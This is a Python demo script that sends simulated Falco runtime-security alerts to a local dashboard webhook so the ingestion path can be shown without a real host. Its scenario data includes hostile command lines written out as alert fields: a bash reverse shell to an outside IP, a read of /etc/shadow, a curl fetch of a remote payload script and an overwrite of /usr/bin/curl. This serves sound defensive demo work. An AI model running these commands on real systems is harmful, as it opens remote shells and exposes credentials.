"""
Simulates Falco runtime alerts for demos, without needing a Linux/EC2 host.

The script POSTs Falco-formatted JSON to the real webhook (POST /api/alerts/falco), so
the whole ingestion path runs exactly as it would with real Falco: priority mapping,
storage, Prometheus counters and the SNS notification for critical alerts.

Run from the backend/ folder with the backend already running:
    python scripts/simulate_falco_attack.py                  # fire every scenario, 2s apart
    python scripts/simulate_falco_attack.py --count 3        # fire 3 random scenarios
    python scripts/simulate_falco_attack.py --interval 0     # fire them instantly
    python scripts/simulate_falco_attack.py --reset          # delete old simulated alerts first
    python scripts/simulate_falco_attack.py --url http://localhost:8000
"""

import argparse
import random
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

# Allow `from app...` imports when run as a script from any folder.
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import httpx  # noqa: E402

from app.config import settings  # noqa: E402

# Modelled on Falco's default ruleset. Priorities use Falco's own names.
SCENARIOS = [
    {
        "rule": "Reverse Shell Spawned", "priority": "Critical",
        "container": "web-app-1", "cmdline": "bash -i >& /dev/tcp/45.33.21.7/4444 0>&1",
        "output": "A reverse shell was spawned inside container web-app-1, connecting outbound to "
                  "45.33.21.7:4444. This usually means an attacker has remote command execution.",
        "tags": ["container", "shell", "network", "mitre_execution"],
    },
    {
        "rule": "Read Sensitive File", "priority": "Critical",
        "container": "auth-service", "cmdline": "cat /etc/shadow",
        "output": "Process 'cat' read /etc/shadow inside container auth-service. This file holds hashed "
                  "passwords and should never be read by an application process.",
        "tags": ["container", "filesystem", "mitre_credential_access"],
    },
    {
        "rule": "Unexpected Outbound Connection", "priority": "Error",
        "container": "payment-api", "cmdline": "curl http://185.220.101.4/payload.sh",
        "output": "Container payment-api opened an outbound connection to 185.220.101.4, an address "
                  "with no prior association with this service.",
        "tags": ["container", "network"],
    },
    {
        "rule": "Terminal Shell Spawned in Container", "priority": "Warning",
        "container": "nginx-frontend", "cmdline": "/bin/sh",
        "output": "A shell was spawned inside container nginx-frontend via 'docker exec'. Interactive "
                  "shells in production containers are unusual and worth reviewing.",
        "tags": ["container", "shell"],
    },
    {
        "rule": "Write Below Binary Directory", "priority": "Error",
        "container": "web-app-1", "cmdline": "echo malicious > /usr/bin/curl",
        "output": "A write was detected to /usr/bin inside container web-app-1. Modifying system "
                  "binaries is a common persistence technique.",
        "tags": ["container", "filesystem", "mitre_persistence"],
    },
]


def build_payload(scenario: dict) -> dict:
    """The JSON body real Falco would send for this detection."""
    return {
        "rule": scenario["rule"],
        "priority": scenario["priority"],
        "output": scenario["output"],
        "time": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
        "hostname": "aegis-demo-host",
        "source": "syscall",
        "tags": scenario["tags"],
        "output_fields": {
            "container.name": scenario["container"],
            "container.id": f"c{random.randint(100000, 999999)}",
            "proc.cmdline": scenario["cmdline"],
        },
    }


def reset_simulated_alerts() -> None:
    """Delete previously simulated alerts straight from MongoDB."""
    from pymongo import MongoClient

    client = MongoClient(settings.MONGO_URI, serverSelectionTimeoutMS=5000)
    deleted = client[settings.MONGO_DB].alerts.delete_many({"simulated": True}).deleted_count
    print(f"Cleared {deleted} previous simulated alert(s).")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--url", default="http://localhost:8000", help="Backend base URL.")
    parser.add_argument("--count", type=int, default=None, help="How many random scenarios to fire (default: all).")
    parser.add_argument("--interval", type=float, default=2.0, help="Seconds between alerts (default: 2).")
    parser.add_argument("--reset", action="store_true", help="Delete earlier simulated alerts first.")
    args = parser.parse_args()

    if args.reset:
        reset_simulated_alerts()

    scenarios = SCENARIOS if args.count is None else random.sample(SCENARIOS, k=min(args.count, len(SCENARIOS)))
    headers = {"X-Aegis-Simulated": "true"}
    if settings.FALCO_WEBHOOK_SECRET:
        headers["X-Falco-Secret"] = settings.FALCO_WEBHOOK_SECRET

    endpoint = args.url.rstrip("/") + "/api/alerts/falco"
    print(f"Sending {len(scenarios)} simulated Falco alert(s) to {endpoint}\n")

    sent = 0
    with httpx.Client(timeout=10) as client:
        for i, scenario in enumerate(scenarios, start=1):
            try:
                response = client.post(endpoint, json=build_payload(scenario), headers=headers)
            except httpx.ConnectError:
                print(f"Can't reach the backend at {args.url}. Start it with: uvicorn main:app --reload")
                sys.exit(1)

            if response.status_code == 401:
                print("The webhook rejected the secret. Make sure FALCO_WEBHOOK_SECRET in backend/.env is correct.")
                sys.exit(1)
            if response.status_code != 201:
                print(f"Unexpected response {response.status_code}: {response.text}")
                sys.exit(1)

            sent += 1
            level = response.json()["priority"].upper()
            print(f"[{i}/{len(scenarios)}] {level:<8} {scenario['rule']}  ({scenario['container']})")
            if i < len(scenarios) and args.interval > 0:
                time.sleep(args.interval)

    print(f"\nDone: {sent} alert(s) stored. Open the Runtime alerts page to see them.")


if __name__ == "__main__":
    main()